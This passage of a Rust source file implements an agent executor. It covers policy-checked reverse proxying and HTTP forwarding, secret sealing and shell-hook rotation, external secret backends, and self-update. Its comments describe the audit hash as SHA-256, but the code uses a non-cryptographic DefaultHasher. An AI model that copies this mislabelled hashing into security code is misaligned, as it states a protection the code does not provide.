        for (k, v) in headers {
            req_builder = req_builder.header(k.as_str(), v.as_str());
        }
        if let Some(b) = body {
            req_builder = req_builder.body(b.to_vec());
        }

        let resp = match req_builder.send().await {
            Ok(r) => r,
            Err(e) => {
                self.audit(
                    request_id,
                    "reverse_proxy",
                    Some(format!("{method} {path}")),
                    "error",
                    String::new(),
                    None,
                    start.elapsed().as_millis() as u64,
                    None,
                );
                return RpcResult::Error {
                    message: format!("upstream request failed: {e}"),
                };
            }
        };

        let status = resp.status().as_u16();
        let resp_headers: Vec<(String, String)> = resp
            .headers()
            .iter()
            .map(|(k, v)| (k.as_str().to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();

        let body_bytes = match resp.bytes().await {
            Ok(b) => b,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("reading upstream response body: {e}"),
                };
            }
        };

        // Enforce response size limit
        if body_bytes.len() as u64 > effective_max_bytes {
            return RpcResult::Error {
                message: format!(
                    "response body {} bytes exceeds limit {}",
                    body_bytes.len(),
                    effective_max_bytes
                ),
            };
        }

        let latency_ms = upstream_start.elapsed().as_millis() as u64;

        self.audit(
            request_id,
            "reverse_proxy",
            Some(format!("{method} {path} -> {status}")),
            "allowed",
            String::new(),
            None,
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::ReverseProxyResponse {
            status,
            headers: resp_headers,
            body: if body_bytes.is_empty() {
                None
            } else {
                Some(body_bytes.to_vec())
            },
            latency_ms,
        }
    }

    async fn handle_proxy(
        &self,
        request_id: &str,
        target: &str,
        idle_timeout_secs: Option<u32>,
        max_duration_secs: Option<u32>,
        start: Instant,
    ) -> RpcResult {
        // Policy check — use network target policy (CIDR/hostname/port rules)
        let policy = self.policy.read().await;
        let decision = policy.check_network_target(target);
        if !decision.allowed {
            self.audit(
                request_id,
                "proxy",
                Some(target.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        // Resolve effective timeouts: request overrides < policy defaults
        let effective_idle = idle_timeout_secs.unwrap_or(policy.proxy_idle_timeout_seconds);
        let effective_max = max_duration_secs.unwrap_or(policy.proxy_max_duration_seconds);
        drop(policy);

        // Attempt TCP connection to target
        match tokio::net::TcpStream::connect(target).await {
            Ok(_stream) => {
                // Connection successful — generate proxy ID
                // The actual bidirectional copy is handled by the agent's RPC loop
                // using yamux streams (similar to port forwarding)
                let proxy_id = format!("proxy-{}", &request_id[..8.min(request_id.len())]);
                self.audit(
                    request_id,
                    "proxy",
                    Some(target.to_string()),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::ProxyConnected {
                    proxy_id,
                    idle_timeout_secs: effective_idle,
                    max_duration_secs: effective_max,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("connect to {target}: {e}"),
            },
        }
    }

    /// Handle an HTTP forward request: inspect method+path against HTTP policy,
    /// check network target, connect to upstream, send raw HTTP, read response.
    #[allow(clippy::too_many_arguments)]
    async fn handle_http_forward(
        &self,
        request_id: &str,
        target: &str,
        method: &str,
        path: &str,
        headers: &HashMap<String, String>,
        body: &[u8],
        start: Instant,
    ) -> RpcResult {
        let policy = self.policy.read().await;

        // Check HTTP policy (method + path)
        let http_decision = policy.check_http_request(method, path);
        if !http_decision.allowed {
            self.audit(
                request_id,
                "http_forward",
                Some(format!("{method} {path}")),
                "denied",
                http_decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: http_decision.reason,
                rule: http_decision.matched_rule,
            };
        }
        self.record_policy_decision(true);

        // Check header policy (required / forbidden headers)
        let header_decision = policy.check_http_headers(headers);
        if !header_decision.allowed {
            self.audit(
                request_id,
                "http_forward",
                Some(format!("{method} {path}")),
                "denied",
                header_decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: header_decision.reason,
                rule: header_decision.matched_rule,
            };
        }
        self.record_policy_decision(true);

        // Check network target policy (CIDR/hostname/port rules)
        let net_decision = policy.check_network_target(target);
        if !net_decision.allowed {
            self.audit(
                request_id,
                "http_forward",
                Some(format!("{method} {path} -> {target}")),
                "denied",
                net_decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: net_decision.reason,
                rule: net_decision.matched_rule,
            };
        }
        self.record_policy_decision(true);

        // Check request body size limit
        let max_req_body = policy.max_request_body_bytes;
        let max_resp_body = policy.max_response_body_bytes;
        if body.len() as u64 > max_req_body {
            self.audit(
                request_id,
                "http_forward",
                Some(format!("{method} {path}")),
                "denied",
                "max_request_body_bytes".to_string(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            return RpcResult::Denied {
                reason: format!("request body too large: {} > {max_req_body}", body.len()),
                rule: "max_request_body_bytes".to_string(),
            };
        }

        let matched_rule = http_decision.matched_rule.clone();
        let max_http_reqs = policy.max_http_requests_per_window;
        let http_window_secs = policy.http_rate_limit_window_secs;
        drop(policy);

        // Per-destination rate limit: prevent AI agent loops from overwhelming upstream services
        if max_http_reqs > 0 {
            let now = Instant::now();
            let window = Duration::from_secs(http_window_secs);
            let mut rates = self.http_dest_rate.lock().await;
            let timestamps = rates
                .entry(target.to_string())
                .or_insert_with(std::collections::VecDeque::new);
            // Evict timestamps that have expired from the window
            while let Some(&front) = timestamps.front() {
                if now.duration_since(front) > window {
                    timestamps.pop_front();
                } else {
                    break;
                }
            }
            if timestamps.len() as u32 >= max_http_reqs {
                self.audit(
                    request_id,
                    "http_forward",
                    Some(format!("{method} {path} -> {target}")),
                    "denied",
                    "resources.maxHttpRequestsPerWindow".to_string(),
                    None,
                    start.elapsed().as_millis() as u64,
                    None,
                );
                return RpcResult::Denied {
                    reason: format!(
                        "rate limit exceeded: {max_http_reqs} requests per {http_window_secs}s to {target}"
                    ),
                    rule: "resources.maxHttpRequestsPerWindow".to_string(),
                };
            }
            timestamps.push_back(now);
        }

        // Connect to upstream
        let mut stream = match tokio::net::TcpStream::connect(target).await {
            Ok(s) => s,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("connect to {target}: {e}"),
                };
            }
        };

        // Build raw HTTP request
        let mut raw_request = format!("{method} {path} HTTP/1.1\r\nHost: {target}\r\n");
        for (key, value) in headers {
            // Prevent header injection (no \r\n in header values)
            if key.contains('\r')
                || key.contains('\n')
                || value.contains('\r')
                || value.contains('\n')
            {
                return RpcResult::Denied {
                    reason: "header injection detected".to_string(),
                    rule: "header_injection_check".to_string(),
                };
            }
            raw_request.push_str(&format!("{key}: {value}\r\n"));
        }
        if !body.is_empty() {
            raw_request.push_str(&format!("Content-Length: {}\r\n", body.len()));
        }
        raw_request.push_str("\r\n");

        // Send request
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        if let Err(e) = stream.write_all(raw_request.as_bytes()).await {
            return RpcResult::Error {
                message: format!("write request to {target}: {e}"),
            };
        }
        if !body.is_empty() {
            if let Err(e) = stream.write_all(body).await {
                return RpcResult::Error {
                    message: format!("write request body to {target}: {e}"),
                };
            }
        }

        // Read response (up to max_response_body_bytes + header overhead)
        let max_read = max_resp_body as usize + 65536; // extra for headers
        let mut buf = vec![0u8; max_read.min(16 * 1024 * 1024)]; // cap at 16 MB
        let mut total_read = 0usize;

        // Read until we have complete headers + body
        loop {
            if total_read >= buf.len() {
                break;
            }
            match stream.read(&mut buf[total_read..]).await {
                Ok(0) => break,
                Ok(n) => {
                    total_read += n;
                    // Check if we have the full response (headers + content-length body)
                    if let Some(header_end) = find_header_end(&buf[..total_read]) {
                        // Parse headers to find content-length
                        let mut resp_headers = [httparse::EMPTY_HEADER; 64];
                        let mut response = httparse::Response::new(&mut resp_headers);
                        if response.parse(&buf[..total_read]).is_ok() {
                            let content_length = response
                                .headers
                                .iter()
                                .find(|h| h.name.eq_ignore_ascii_case("content-length"))
                                .and_then(|h| std::str::from_utf8(h.value).ok())
                                .and_then(|v| v.parse::<usize>().ok())
                                .unwrap_or(0);
                            if total_read >= header_end + content_length {
                                break;
                            }
                        }
                    }
                }
                Err(e) => {
                    return RpcResult::Error {
                        message: format!("read response from {target}: {e}"),
                    };
                }
            }
        }

        let response_data = &buf[..total_read];

        // Parse response with httparse
        let mut resp_headers = [httparse::EMPTY_HEADER; 64];
        let mut response = httparse::Response::new(&mut resp_headers);
        let header_len = match response.parse(response_data) {
            Ok(httparse::Status::Complete(len)) => len,
            Ok(httparse::Status::Partial) => {
                return RpcResult::Error {
                    message: "incomplete HTTP response from upstream".to_string(),
                };
            }
            Err(e) => {
                return RpcResult::Error {
                    message: format!("invalid HTTP response from upstream: {e}"),
                };
            }
        };

        let status_code = response.code.unwrap_or(0);
        let mut resp_header_map = HashMap::new();
        for h in response.headers.iter() {
            if h.name.is_empty() {
                break;
            }
            resp_header_map.insert(
                h.name.to_string(),
                String::from_utf8_lossy(h.value).to_string(),
            );
        }

        let resp_body = response_data[header_len..].to_vec();

        // Check response body size
        if resp_body.len() as u64 > max_resp_body {
            self.audit(
                request_id,
                "http_forward",
                Some(format!("{method} {path} -> {target}")),
                "denied",
                "max_response_body_bytes".to_string(),
                Some(resp_body.len() as i32),
                start.elapsed().as_millis() as u64,
                None,
            );
            return RpcResult::Denied {
                reason: format!(
                    "response body too large: {} > {max_resp_body}",
                    resp_body.len()
                ),
                rule: "max_response_body_bytes".to_string(),
            };
        }

        let latency_ms = start.elapsed().as_millis() as u64;

        // Audit success
        self.audit(
            request_id,
            "http_forward",
            Some(format!("{method} {path} -> {target}")),
            "allowed",
            matched_rule,
            Some(status_code as i32),
            latency_ms,
            None,
        );

        RpcResult::HttpResponse {
            status_code,
            headers: resp_header_map,
            body: resp_body,
            latency_ms,
        }
    }

    // ── Secret rotation ────────────────────────────────────────────────────

    /// Handle a manual `RotateSecret` request.
    ///
    /// If the secret has a rotation hook configured, the hook is executed as a shell
    /// command and its stdout is used as the new plaintext value.  If no hook is
    /// configured the request is rejected — there is nothing to run.
    async fn handle_rotate_secret(
        &self,
        request_id: &str,
        name: &str,
        start: Instant,
    ) -> RpcResult {
        // Policy check — treat rotation like a write to the secrets namespace.
        let policy_decision = self
            .policy
            .read()
            .await
            .check_path(std::path::Path::new(name));
        if !policy_decision.allowed {
            self.audit(
                request_id,
                "rotate_secret",
                Some(name.to_string()),
                "denied",
                policy_decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            return RpcResult::Denied {
                reason: policy_decision.reason,
                rule: policy_decision.matched_rule,
            };
        }

        let secrets_arc = match &self.secrets {
            Some(s) => s.clone(),
            None => {
                return RpcResult::Error {
                    message: "secret store not configured — start agent with --seal-key-path <32-byte-file> to enable secrets".to_string(),
                };
            }
        };

        // Collect hook / config under a brief lock, then release before running the command.
        let (hook, ttl_secs, grace_period_secs, health_check) = {
            let store = secrets_arc.lock().await;
            if !store.contains(name) {
                return RpcResult::Error {
                    message: format!("secret '{name}' not found"),
                };
            }
            let rc = match store.rotation_config(name) {
                Some(rc) => rc.clone(),
                None => {
                    return RpcResult::Error {
                        message: format!(
                            "secret '{name}' has no rotation config — use SetSecretRotation first"
                        ),
                    };
                }
            };
            (
                rc.hook.clone(),
                rc.ttl.as_secs(),
                rc.grace_period.as_secs(),
                rc.health_check.clone(),
            )
        };

        // Run the rotation hook to produce the new secret value.
        let hook_cmd = match &hook {
            Some(h) => h.clone(),
            None => {
                return RpcResult::Error {
                    message: format!(
                        "secret '{name}' has no rotation hook — manual value update required"
                    ),
                };
            }
        };

        let hook_output = match tokio::process::Command::new("sh")
            .arg("-c")
            .arg(&hook_cmd)
            .output()
            .await
        {
            Ok(out) if out.status.success() => out.stdout,
            Ok(out) => {
                let stderr = String::from_utf8_lossy(&out.stderr).to_string();
                self.audit(
                    request_id,
                    "rotate_secret",
                    Some(name.to_string()),
                    "error",
                    "hook_failed".to_string(),
                    out.status.code(),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                return RpcResult::Error {
                    message: format!(
                        "rotation hook failed (exit {:?}): {stderr}",
                        out.status.code()
                    ),
                };
            }
            Err(e) => {
                return RpcResult::Error {
                    message: format!("rotation hook exec error: {e}"),
                };
            }
        };

        // Trim trailing whitespace/newlines from hook output.
        let new_value = hook_output
            .strip_suffix(b"\n")
            .or_else(|| hook_output.strip_suffix(b"\r\n"))
            .unwrap_or(&hook_output)
            .to_vec();

        // Run optional health check before committing the rotation.
        if let Some(hc_cmd) = &health_check {
            let hc_result = tokio::process::Command::new("sh")
                .arg("-c")
                .arg(hc_cmd)
                .env(
                    "RF_NEW_SECRET",
                    String::from_utf8_lossy(&new_value).as_ref(),
                )
                .output()
                .await;
            match hc_result {
                Ok(out) if out.status.success() => {
                    // Health check passed — proceed with rotation.
                }
                Ok(out) => {
                    let stderr = String::from_utf8_lossy(&out.stderr).to_string();
                    self.audit(
                        request_id,
                        "rotate_secret",
                        Some(name.to_string()),
                        "error",
                        "health_check_failed".to_string(),
                        out.status.code(),
                        start.elapsed().as_millis() as u64,
                        None,
                    );
                    return RpcResult::Error {
                        message: format!(
                            "health check failed (exit {:?}), rotation aborted: {stderr}",
                            out.status.code()
                        ),
                    };
                }
                Err(e) => {
                    return RpcResult::Error {
                        message: format!("health check exec error: {e}"),
                    };
                }
            }
        }

        // SHA-256 hash of the new value (for audit — never log the plaintext).
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};
        let mut hasher = DefaultHasher::new();
        new_value.hash(&mut hasher);
        let new_value_hash = format!("{:016x}", hasher.finish());

        // Commit the rotation.
        {
            let mut store = secrets_arc.lock().await;
            if let Err(e) = store.rotate(name, &new_value) {
                return RpcResult::Error {
                    message: format!("rotate failed: {e}"),
                };
            }
        }

        self.audit(
            request_id,
            "rotate_secret",
            Some(name.to_string()),
            "allowed",
            "rotation_hook".to_string(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::Rotated {
            name: name.to_string(),
            new_value_hash,
            ttl_secs,
            grace_period_secs,
        }
    }

    /// Handle a `SetSecretRotation` request — configure TTL + hook for a named secret.
    async fn handle_set_secret_rotation(
        &self,
        request_id: &str,
        name: &str,
        ttl_secs: u64,
        hook: Option<&str>,
        grace_period_secs: u64,
        health_check: Option<&str>,
        start: Instant,
    ) -> RpcResult {
        use rf_crypto::secrets::RotationConfig;
        use std::time::Duration;

        let secrets_arc = match &self.secrets {
            Some(s) => s.clone(),
            None => {
                return RpcResult::Error {
                    message: "secret store not configured — start agent with --seal-key-path <32-byte-file> to enable secrets".to_string(),
                };
            }
        };

        {
            let store = secrets_arc.lock().await;
            if !store.contains(name) {
                return RpcResult::Error {
                    message: format!("secret '{name}' not found — seal it first"),
                };
            }
        }

        let mut config = RotationConfig::new(
            Duration::from_secs(ttl_secs),
            hook.map(str::to_string),
            Duration::from_secs(grace_period_secs),
        );
        if let Some(hc) = health_check {
            config = config.with_health_check(hc.to_string());
        }

        {
            let mut store = secrets_arc.lock().await;
            if let Err(e) = store.set_rotation_config(name, config) {
                return RpcResult::Error {
                    message: format!("set rotation config failed: {e}"),
                };
            }
        }

        self.audit(
            request_id,
            "set_secret_rotation",
            Some(name.to_string()),
            "allowed",
            format!("ttl={ttl_secs}s grace={grace_period_secs}s"),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::RotationConfigured {
            name: name.to_string(),
            ttl_secs,
        }
    }
}

/// Find the end of HTTP headers (double CRLF) in a buffer.
fn find_header_end(buf: &[u8]) -> Option<usize> {
    for i in 0..buf.len().saturating_sub(3) {
        if &buf[i..i + 4] == b"\r\n\r\n" {
            return Some(i + 4);
        }
    }
    None
}

// ── External secret backend handlers ─────────────────────────────────────────

#[cfg(feature = "secret-backends")]
impl Executor {
    /// Register an external secret backend and optionally start a background sync task.
    async fn handle_configure_secret_backend(
        &self,
        request_id: &str,
        name: &str,
        backend_type: &str,
        config_json: &str,
        sync_interval_secs: u64,
        sync_paths: &[String],
        start: Instant,
    ) -> RpcResult {
        use crate::secret_backends::{RegisteredBackend, build_backend};
        use std::time::Duration;

        // Policy check — treat backend registration as a write to the secrets namespace.
        let policy_guard = self.policy.read().await;
        let decision = policy_guard.check_path(std::path::Path::new("secrets"));
        if !decision.allowed {
            self.audit(
                request_id,
                "configure_secret_backend",
                Some(format!("{backend_type}:{name}")),
                "deny",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        drop(policy_guard);

        let backend = match build_backend(backend_type, config_json) {
            Ok(b) => b,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("failed to build backend '{backend_type}': {e}"),
                };
            }
        };

        let sync_paths_vec = sync_paths.to_vec();
        let rb = RegisteredBackend {
            backend,
            sync_interval: Duration::from_secs(sync_interval_secs),
            sync_paths: sync_paths_vec,
        };

        {
            let mut registry = self.backend_registry.write().await;
            registry.register(name.to_string(), rb);
        }

        self.audit(
            request_id,
            "configure_secret_backend",
            Some(format!("{backend_type}:{name}")),
            "allow",
            String::new(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::SecretBackendConfigured {
            name: name.to_string(),
            backend_type: backend_type.to_string(),
        }
    }

    /// Fetch a secret value from a registered external backend.
    async fn handle_fetch_from_backend(
        &self,
        request_id: &str,
        backend_name: &str,
        path: &str,
        start: Instant,
    ) -> RpcResult {
        // Policy check — treat as a read from the secrets namespace.
        let policy_guard = self.policy.read().await;
        let decision = policy_guard.check_path(std::path::Path::new("secrets"));
        if !decision.allowed {
            self.audit(
                request_id,
                "fetch_from_backend",
                Some(format!("{backend_name}:{path}")),
                "deny",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        drop(policy_guard);

        let registry = self.backend_registry.read().await;
        match registry.fetch(backend_name, path).await {
            Ok(value) => {
                self.audit(
                    request_id,
                    "fetch_from_backend",
                    Some(format!("{backend_name}:{path}")),
                    "allow",
                    String::new(),
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::SecretFetched {
                    backend: backend_name.to_string(),
                    path: path.to_string(),
                    value,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("backend '{backend_name}' fetch '{path}' failed: {e}"),
            },
        }
    }

    /// Seal (push) a secret value on the agent.
    ///
    /// If the secret already exists and `grace_period_secs > 0` the old value is archived
    /// into a grace window so in-flight operations can finish before the old value expires.
    async fn handle_seal_secret(
        &self,
        request_id: &str,
        name: &str,
        value: &str,
        grace_period_secs: u64,
        start: Instant,
    ) -> RpcResult {
        let secrets_arc = match &self.secrets {
            Some(s) => s.clone(),
            None => {
                return RpcResult::Error {
                    message: "secret store not configured — start agent with --seal-key-path <32-byte-file> to enable secrets".to_string(),
                };
            }
        };

        let plaintext = value.as_bytes();

        // Compute a hash for the audit trail (never log the plaintext).
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};
        let mut hasher = DefaultHasher::new();
        plaintext.hash(&mut hasher);
        let value_hash = format!("{:016x}", hasher.finish());

        let mut store = secrets_arc.lock().await;
        let already_exists = store.contains(name);

        let result = if already_exists && grace_period_secs > 0 {
            // Rotate with grace period: old value stays valid for `grace_period_secs` seconds.
            let grace = std::time::Duration::from_secs(grace_period_secs);
            // Attach a temporary rotation config if none exists yet.
            if store.rotation_config(name).is_none() {
                let rc = rf_crypto::secrets::RotationConfig::new(
                    std::time::Duration::from_secs(86400), // TTL doesn't matter here
                    None,
                    grace,
                );
                let _ = store.set_rotation_config(name, rc);
            }
            store.rotate(name, plaintext)
        } else {
            store.seal(name, plaintext)
        };
        drop(store);

        match result {
            Ok(()) => {
                self.audit(
                    request_id,
                    "seal_secret",
                    Some(name.to_string()),
                    "allowed",
                    if already_exists { "rotated" } else { "new" }.to_string(),
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::SecretSealed {
                    name: name.to_string(),
                    value_hash,
                    rotated: already_exists,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("seal_secret '{name}' failed: {e}"),
            },
        }
    }

    /// List names of all secrets in the store. Never returns values.
    async fn handle_list_secrets(&self, request_id: &str, start: Instant) -> RpcResult {
        let secrets_arc = match &self.secrets {
            Some(s) => s.clone(),
            None => {
                return RpcResult::Error {
                    message: "secret store not configured — start agent with --seal-key-path <32-byte-file> to enable secrets".to_string(),
                };
            }
        };

        let store = secrets_arc.lock().await;
        let mut names: Vec<String> = store.list().into_iter().map(String::from).collect();
        names.sort();
        drop(store);

        self.audit(
            request_id,
            "list_secrets",
            None,
            "allowed",
            String::new(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::SecretsList { names }
    }
}

impl Executor {
    /// Handle a `CheckUpdate` RPC action.
    ///
    /// No update server is configured by default — returns `UpdateNotAvailable`
    /// and records an audit entry. A real deployment would query a configured
    /// artifact URL and compare semver before responding.
    async fn handle_check_update(
        &self,
        request_id: &str,
        current_version: &str,
        start: Instant,
    ) -> RpcResult {
        if let Err(e) = self.audit.log(AuditEntry {
            timestamp: chrono::Utc::now(),
            request_id: request_id.to_string(),
            action: "check-update".to_string(),
            command: None,
            decision: "allow".to_string(),
            matched_rule: "check-update".to_string(),
            exit_code: Some(0),
            duration_ms: start.elapsed().as_millis() as u64,
            caller_key: self.caller_key.clone(),
            reason: Some(format!("current_version={current_version}")),
            prev_hash: None,
            hmac: None,
        }) {
            tracing::warn!("audit write failed: {e}");
        }
        RpcResult::UpdateNotAvailable
    }

    /// Handle an `UpdateAgent` RPC action.
    ///
    /// Downloads the binary at `url`, verifies SHA-256, backs up the running
    /// binary, atomically installs the new one, and exec()-s it. On failure
    /// the backup is restored and `UpdateFailed` is returned.
    ///
    /// Checks the version pin and update window before downloading.
    async fn handle_update_agent(
        &self,
        request_id: &str,
        version: &str,
        url: &str,
        sha256: &str,
        allow_downgrade: bool,
        start: Instant,
    ) -> RpcResult {
        use crate::updater;

        // Check version pin.
        {
            let pin = self.pinned_version.read().await;
            if let Some(pinned) = pin.as_deref() {
                if pinned != version {
                    let reason = format!(
                        "agent is pinned to version {pinned}, refusing update to {version}"
                    );
                    tracing::warn!("{reason}");
                    let _ = self.audit.log(AuditEntry {
                        timestamp: chrono::Utc::now(),
                        request_id: request_id.to_string(),
                        action: "update-agent".to_string(),
                        command: Some(format!("update to {version}")),
                        decision: "deny".to_string(),
                        matched_rule: "version-pinned".to_string(),
                        exit_code: Some(1),
                        duration_ms: start.elapsed().as_millis() as u64,
                        caller_key: self.caller_key.clone(),
                        reason: Some(reason.clone()),
                        prev_hash: None,
                        hmac: None,
                    });
                    return RpcResult::UpdateFailed { reason };
                }
            }
        }

        // Check update window.
        {
            let window = self.update_window.read().await;
            if let Some(w) = window.as_deref() {
                if !is_within_update_window(w) {
                    let reason = format!("current time is outside update window \"{w}\"");
                    tracing::warn!("{reason}");
                    let _ = self.audit.log(AuditEntry {
                        timestamp: chrono::Utc::now(),
                        request_id: request_id.to_string(),
                        action: "update-agent".to_string(),
                        command: Some(format!("update to {version}")),
                        decision: "deny".to_string(),
                        matched_rule: "outside-update-window".to_string(),
                        exit_code: Some(1),
                        duration_ms: start.elapsed().as_millis() as u64,
                        caller_key: self.caller_key.clone(),
                        reason: Some(reason.clone()),
                        prev_hash: None,
                        hmac: None,
                    });
                    return RpcResult::UpdateFailed { reason };
                }
            }
        }

        let binary_path = match std::env::current_exe() {
            Ok(p) => p,
            Err(e) => {
                let reason = format!("cannot determine binary path: {e}");
                tracing::warn!("{reason}");
                return RpcResult::UpdateFailed { reason };
            }
        };

        tracing::info!("applying update to version {version} from {url}");

        let bak_path = match updater::download_and_install(url, sha256, &binary_path).await {
            Ok(bak) => bak,
            Err(e) => {
                let reason = format!("download/install failed: {e}");
                tracing::warn!("{reason}");
                let _ = self.audit.log(AuditEntry {
                    timestamp: chrono::Utc::now(),
                    request_id: request_id.to_string(),
                    action: "update-agent".to_string(),
                    command: Some(format!("update to {version}")),
                    decision: "deny".to_string(),
                    matched_rule: "update-failed".to_string(),
                    exit_code: Some(1),
                    duration_ms: start.elapsed().as_millis() as u64,
                    caller_key: self.caller_key.clone(),
                    reason: Some(reason.clone()),
                    prev_hash: None,
                    hmac: None,
                });
                // Fire webhook alert on download failure.
                if let Some(hook_url) = self.alert_webhook.read().await.clone() {
                    crate::webhook::send_update_failure(
                        &hook_url,
                        &self.agent_id,
                        version,
                        &reason,
                        false,
                    )
                    .await;
                }
                return RpcResult::UpdateFailed { reason };
            }
        };

        let _ = self.audit.log(AuditEntry {
            timestamp: chrono::Utc::now(),
            request_id: request_id.to_string(),
            action: "update-agent".to_string(),
            command: Some(format!("update to {version}")),
            decision: "allow".to_string(),
            matched_rule: "update-applied".to_string(),
            exit_code: Some(0),
            duration_ms: start.elapsed().as_millis() as u64,
            caller_key: self.caller_key.clone(),
            reason: Some(format!("url={url} allow_downgrade={allow_downgrade}")),
            prev_hash: None,
            hmac: None,
        });

        // exec() the new binary — does not return on Unix.
        if let Err(e) = updater::restart_process(&binary_path) {
            tracing::warn!("exec failed, rolling back: {e}");
            let _ = updater::rollback(&binary_path, &bak_path).await;
            let reason = format!("exec failed: {e}");
            // Fire webhook alert on rollback.
            if let Some(hook_url) = self.alert_webhook.read().await.clone() {
                crate::webhook::send_update_failure(
                    &hook_url,
                    &self.agent_id,
                    version,
                    &reason,
                    true,
                )
                .await;
            }
            return RpcResult::UpdateFailed { reason };
        }

        // Reached on Windows after spawning the new process.
        RpcResult::UpdateApplied {
            version: version.to_string(),
            restarting: true,
        }
    }

    /// Pin this agent to a specific version.
    ///
    /// Future `UpdateAgent` requests for any other version are rejected
    /// while the pin is active.
    async fn handle_pin_version(
        &self,
        request_id: &str,
        version: &str,
        start: Instant,
    ) -> RpcResult {
        {
            let mut pin = self.pinned_version.write().await;
            *pin = Some(version.to_string());
        }
        self.audit(
            request_id,
            "pin-version",
            Some(version.to_string()),
            "allowed",
            "built-in".into(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );
        RpcResult::VersionPinned {
            version: version.to_string(),
        }
    }

    /// Clear the active version pin, resuming normal auto-update behaviour.
    async fn handle_unpin_version(&self, request_id: &str, start: Instant) -> RpcResult {
        {
            let mut pin = self.pinned_version.write().await;
            *pin = None;
        }
        self.audit(
            request_id,
            "unpin-version",
            None,
            "allowed",
            "built-in".into(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );
        RpcResult::VersionUnpinned
    }

    /// Report this agent's current version, pin, and update window.
    async fn handle_get_version_info(&self, request_id: &str, start: Instant) -> RpcResult {
        let pinned_version = self.pinned_version.read().await.clone();
        let update_window = self.update_window.read().await.clone();
        self.audit(
            request_id,
            "get-version-info",
            None,
            "allowed",
            "built-in".into(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );
        RpcResult::VersionInfo {
            agent_id: self.agent_id.clone(),
            current_version: env!("CARGO_PKG_VERSION").to_string(),
            pinned_version,
            update_window,
        }
    }

    /// Set or clear the maintenance window for auto-updates.
    ///
    /// `window` format: `"HH:MM-HH:MM"` (24-hour daily window).
    /// Pass `None` to allow updates at any time.
    async fn handle_set_update_window(
        &self,
        request_id: &str,
        window: Option<&str>,
        start: Instant,
    ) -> RpcResult {
        let window_clone = window.map(str::to_string);
        {
            let mut w = self.update_window.write().await;
            *w = window_clone.clone();
        }
        self.audit(
            request_id,
            "set-update-window",
            window.map(str::to_string),
            "allowed",
            "built-in".into(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );
        RpcResult::UpdateWindowSet {
            window: window_clone,
        }
    }

    /// Handle a `RolloutHealthCheck` RPC action.
    ///
    /// Verifies the agent is responsive and returns version + uptime.
    async fn handle_rollout_health_check(&self, request_id: &str, start: Instant) -> RpcResult {
        let _ = self.audit.log(AuditEntry {
            timestamp: chrono::Utc::now(),
            request_id: request_id.to_string(),
            action: "rollout-health-check".to_string(),
            command: None,
            decision: "allow".to_string(),
            matched_rule: "built-in".to_string(),
            exit_code: Some(0),
            duration_ms: start.elapsed().as_millis() as u64,
            caller_key: self.caller_key.clone(),
            reason: Some(format!("agent_id={}", self.agent_id)),
            prev_hash: None,
            hmac: None,
        });
        RpcResult::HealthCheckPassed {
            agent_id: self.agent_id.clone(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            uptime_secs: self.start_time.elapsed().as_secs(),
        }
    }

    /// Handle a `SetAlertWebhook` RPC action.
    ///
    /// Configures or clears the webhook URL used for update failure alerts.
    async fn handle_set_alert_webhook(
        &self,
        request_id: &str,
        url: Option<&str>,
        start: Instant,
    ) -> RpcResult {
        let url_clone = url.map(|s| s.to_string());
        {
            let mut hook = self.alert_webhook.write().await;
            *hook = url_clone.clone();
        }
        let _ = self.audit.log(AuditEntry {
            timestamp: chrono::Utc::now(),
            request_id: request_id.to_string(),
            action: "set-alert-webhook".to_string(),
            command: url_clone.as_deref().map(|u| format!("webhook={u}")),
            decision: "allow".to_string(),
            matched_rule: "built-in".to_string(),
            exit_code: Some(0),
            duration_ms: start.elapsed().as_millis() as u64,
            caller_key: self.caller_key.clone(),
            reason: None,
            prev_hash: None,
            hmac: None,
        });
        RpcResult::AlertWebhookSet { url: url_clone }
    }
}

/// Check whether the current local time falls within a daily update window.
///
